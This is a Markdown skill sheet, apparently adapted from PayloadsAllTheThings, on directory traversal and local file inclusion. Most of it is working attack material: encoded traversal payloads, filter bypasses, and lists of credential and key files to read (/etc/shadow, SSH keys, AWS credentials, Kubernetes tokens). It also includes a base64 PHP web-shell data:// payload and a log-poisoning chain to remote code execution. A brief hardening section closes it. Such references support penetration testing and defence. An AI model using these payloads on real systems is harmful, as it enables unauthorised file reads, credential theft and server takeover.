---
name: directory-traversal
description: Read arbitrary files via path traversal payloads; cover encoding, bypass tricks, OS-specific targets, and chaining to RCE via log poisoning or wrappers
domain: cybersecurity
subdomain: web-application-security
tags: [path-traversal, lfi, directory-traversal, file-read]
version: "1.0"
license: MIT
source: PayloadsAllTheThings/Directory Traversal
---

# Directory Traversal / Path Traversal

## Overview
User-controlled path segments allow escape from an intended directory with `../` (or encoded variants) to read system files, configs, or source code.

## Payload Patterns
```
../../../../etc/passwd
..\..\..\..\windows\win.ini
%2e%2e%2f%2e%2e%2fetc%2fpasswd      (URL encoded)
%252e%252e%252f                      (double URL encoded)
..%c0%af..%c0%af                    (overlong UTF-8)
..%5c                                (encoded backslash)
....//....//                         (filter-stripping `../` once)
..%2f..%2f
/var/www/html/../../etc/passwd       (absolute prefix)
file:///etc/passwd                   (URL scheme)
\\attacker\share\file                (UNC, Windows)
```

## High-Value Targets
- Linux: `/etc/passwd`, `/etc/shadow`, `/proc/self/environ`, `/proc/self/cmdline`, `/root/.ssh/id_rsa`, `/var/log/apache2/access.log`, `/var/log/auth.log`, `/etc/hosts`, kubernetes `/var/run/secrets/kubernetes.io/serviceaccount/token`.
- Windows: `C:\Windows\win.ini`, `C:\Windows\System32\drivers\etc\hosts`, `C:\inetpub\logs\LogFiles\W3SVC1\u_ex*.log`, `C:\Users\<u>\.aws\credentials`, `unattend.xml`, `sysprep.inf`.
- App: `web.xml`, `.env`, `application.properties`, `wp-config.php`, `database.yml`.

## Filter Bypasses
- Null byte (old PHP < 5.3): `../../etc/passwd%00.jpg`.
- Truncation via long path (`./`*4096).
- Required suffix bypass: `../../etc/passwd%00`, `..%00.jpg`.
- Required prefix bypass: payload includes the prefix string then traverses out.
- Case (Windows): `WIndOWs\WIN.INI`.

## PHP Wrappers (LFI escalation)
```
php://filter/convert.base64-encode/resource=index.php
php://input            (POST body becomes file content)
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOyA/Pg==
expect://id
zip:// phar://         (deserialization)
```

## Chains
- LFI → RCE via log poisoning (`User-Agent: <?php system($_GET[c]); ?>` then include the log).
- LFI on `/proc/self/environ` with UA payload.
- LFI on session files `/var/lib/php/sessions/sess_<id>`.
- LFI → Phar deserialization.

## Tools
- **dotdotpwn**, **ffuf** with LFI wordlists, **LFISuite**, Burp Intruder.

## Hardening
- Resolve to canonical path, ensure it stays within a known root (`os.path.realpath`, `Files.toRealPath`).
- Allowlist filenames; reject `..`, `/`, `\`, null.
- Use indirect references (ID → server-side map) instead of raw paths.

## References
- `payloadsallthethings/Directory Traversal/README.md`
- `payloadsallthethings/File Inclusion/README.md`
